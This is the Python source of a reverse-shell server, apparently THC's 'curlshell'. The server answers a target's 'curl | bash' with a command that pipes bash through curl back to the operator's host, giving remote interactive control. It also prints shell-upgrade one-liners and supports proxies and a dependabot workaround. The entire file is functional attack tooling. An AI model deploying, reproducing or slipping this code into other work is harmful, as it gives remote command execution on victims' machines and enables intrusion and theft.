#!/usr/bin/env python3

from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import ssl
import json
import argparse
import requests
import sys
import select
import threading
import os
from collections import defaultdict

# inspired by: https://stackoverflow.com/questions/29023885/python-socket-readline-without-socket-makefile
import socket
from asyncio import IncompleteReadError  # only import the exception class

class SocketStreamReader:
    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._recv_buffer = bytearray()

    def read(self, num_bytes: int = -1) -> bytes:
        raise NotImplementedError

    def readexactly(self, num_bytes: int) -> bytes:
        buf = bytearray(num_bytes)
        pos = 0
        while pos < num_bytes:
            n = self._recv_into(memoryview(buf)[pos:])
            if n == 0:
                raise IncompleteReadError(bytes(buf[:pos]), num_bytes)
            pos += n
        return bytes(buf)

    def readline(self) -> bytes:
        return self.readuntil(b"\n")

    def readuntil(self, separator: bytes = b"\n") -> bytes:
        if len(separator) != 1:
            raise ValueError("Only separators of length 1 are supported.")

        chunk = bytearray(4096)
        start = 0
        buf = bytearray(len(self._recv_buffer))
        bytes_read = self._recv_into(memoryview(buf))
        assert bytes_read == len(buf)

        while True:
            idx = buf.find(separator, start)
            if idx != -1:
                break

            start = len(self._recv_buffer)
            bytes_read = self._recv_into(memoryview(chunk))
            buf += memoryview(chunk)[:bytes_read]

        result = bytes(buf[: idx + 1])
        self._recv_buffer = b"".join(
            (memoryview(buf)[idx + 1 :], self._recv_buffer)
        )
        return result

    def _recv_into(self, view: memoryview) -> int:
        bytes_read = min(len(view), len(self._recv_buffer))
        view[:bytes_read] = self._recv_buffer[:bytes_read]
        self._recv_buffer = self._recv_buffer[bytes_read:]
        if bytes_read == len(view):
            return bytes_read
        bytes_read += self._sock.readinto1(view[bytes_read:])
        if bytes_read <= 0:
            raise Exception("end of stream")
        return bytes_read

def eprint(*args, **kwargs):
    print(*args, **kwargs, file=sys.stderr)

lock = threading.Lock()
lockdata = defaultdict(int)
def locker(c, d, should_exit):
    if not should_exit:
        return
    lock.acquire()
    try:
        lockdata[c] += d
        if d < 0:
            s = 0
            for k in lockdata:
                v = lockdata[k]
                s += v
            if s <= 0:
                os._exit(0)
    finally:
        lock.release()

class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):

    # Suppress logging
    def log_message(*args):
        pass

    # this is receiving the output of the bash process on the remote end and prints it to the local terminal
    def do_PUT(self):
        self.server.should_exit = False
        d = getattr(sys, "stdout")
        if not d:
            raise Exception("Invalid request")
        locker("stdout", 1, not self.server.args.serve_forever)
        eprint("\x1b[1;32mReverse shell connected.\x1b[0m")
        eprint('\x1b[0;35mTHC says: pimp up your prompt: Cut & Paste the following:\x1b[0m')
        # Fix if SHELL=/usr/sbin/nologin or /bin/false or /bin/false or "" or invalid shell:
        eprint('\x1b[0;36mSHELL=$(${SHELL:-false} -c "echo $SHELL") || unset SHELL;  SHELL=${SHELL:-$(bash -c "echo bash" || ash -c "echo ash")}\x1b[0m')
        eprint('\x1b[0;36mcommand -v script >/dev/null && ${SHELL:-bash} -c : && exec script -qc "/usr/bin/env ${SHELL:-bash} -il" /dev/null\x1b[0m')
        eprint('\x1b[0;36mexport TERM=xterm-256color\x1b[0m')
        eprint("\x1b[0;36mPS1='{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w \[\\e[0;31m\]\\$\[\\e[m\] '\x1b[0m")
        eprint("\x1b[0;36mreset\x1b[0m")
        sr = SocketStreamReader(self.rfile)
        while True:
            line = sr.readline()
            chunksize = int(line, 16)
            if chunksize <= 0:
                break
            data = sr.readexactly(chunksize)
            d.buffer.write(data)
            d.buffer.flush()
            # chunk trailer
            sr.readline()
        # eprint(w, "stream closed")
        eprint("--> \x1b[1;37mJoin us on Telegram - https://t.me/thcorg\x1b[0m")
        self.server.should_exit = True
        locker("stdout", -1, not self.server.args.serve_forever)

    # this is feeding the bash process on the remote end with input typed in the local terminal
    def do_POST(self):
        # eprint("stdin stream connected")
        self.send_response(200)
        self.send_header('Content-Type', "application/binary")
        self.send_header('Transfer-Encoding', 'chunked')
        self.end_headers()
        
        locker("stdin", 1, not self.server.args.serve_forever)
        
        while True:
            s = select.select([sys.stdin, self.request], [], [], 1)[0]
            if self.server.should_exit:
                break
            if self.request in s:
                # input broke
                break
            if sys.stdin in s:
                line = sys.stdin.readline()
                if self.server.args.dependabot_workaround:
                    self.wfile.write(line.encode())
                    self.wfile.flush()
                else:
                    self._send_chunk(line)
        self._send_chunk("")
        # eprint("stdin stream closed")
        
        locker("stdin", -1, not self.server.args.serve_forever)
        
    def do_GET(self):
        eprint("Request received from", self.headers.get('X-Forwarded-For') or self.client_address)
        schema = self.headers['X-Forwarded-Proto']
        if not schema:
            schema = "https" if self.server.args.certificate else "http"
        proxy = ""
        if self.server.args.x:
            proxy = "-x " + self.server.args.x
        # Note: ash/busybox's 'sh -il' will fail with SIGTTIN if not connected to a PTY.
        shell = self.server.args.shell or "{ command -v bash >/dev/null && exec /usr/bin/env bash -il || exec /usr/bin/env sh;}"
        host = self.headers["Host"]
        cmd = f"exec curl {proxy} -X POST -sNk {schema}://{host}/input"
        cmd+= f" | {shell} 2>&1"
        cmd+= f" | curl -sk -T - {schema}://{host}/stdout"
        cmd+=  "\n"
        # sending back the complex command to be executed
        self.send_response(200)
        self.send_header('Content-Type', "text/plain")
        self.send_header('Transfer-Encoding', 'chunked')
        self.end_headers()
        self._send_chunk(cmd)
        self._send_chunk("")
        # eprint("bootstrapping command sent")

    def _send_chunk(self, data):
        if type(data) == str:
            try:
                data = data.encode()
            except UnicodeEncodeError:
                eprint("Invalid unicode character in the input, chunk not sent")
                return
        full_packet = '{:X}\r\n'.format(len(data)).encode()
        full_packet += data
        full_packet += b"\r\n"
        self.wfile.write(full_packet)
        self.wfile.flush()


def do_the_job(args):
    httpd = ThreadingHTTPServer((args.listen_host, args.listen_port), ConDispHTTPRequestHandler)
    setattr(httpd, "args", args)
    setattr(httpd, "should_exit", False)
    if args.certificate and args.private_key:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER )
        context.load_cert_chain(args.certificate, args.private_key)
        httpd.socket = context.wrap_socket(httpd.socket)
        eprint("https listener starting")
    else:
        eprint("plain http listener starting")

    #  handle_request()
    httpd.serve_forever()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Usage on target: curl https://curlshell | bash")
    parser.add_argument("--private-key", help="path to the private key for TLS")
    parser.add_argument("--certificate", help="path to the certificate for TLS")
    parser.add_argument("--listen-host", default="0.0.0.0", help="host to listen on")
    parser.add_argument("--listen-port", type=int, default=443, help="port to listen on")
    parser.add_argument("--serve-forever", default=False, action='store_true', help="whether the server should exit after processing a session (just like nc would)")
    parser.add_argument("--dependabot-workaround", action='store_true', default=False, help="transfer-encoding support in the dependabot proxy is broken, it rewraps the raw chunks. This is a workaround.")
    parser.add_argument("--shell", help="Shell [--shell /bin/sh or --shell '/usr/bin/env zsh -il']")
    parser.add_argument("-x", help="Proxy to use [e.g. -x socks5h://1.2.3.4:1080 or -x http://user:pwd@1.2.3.4:3128]")
    do_the_job(parser.parse_args())
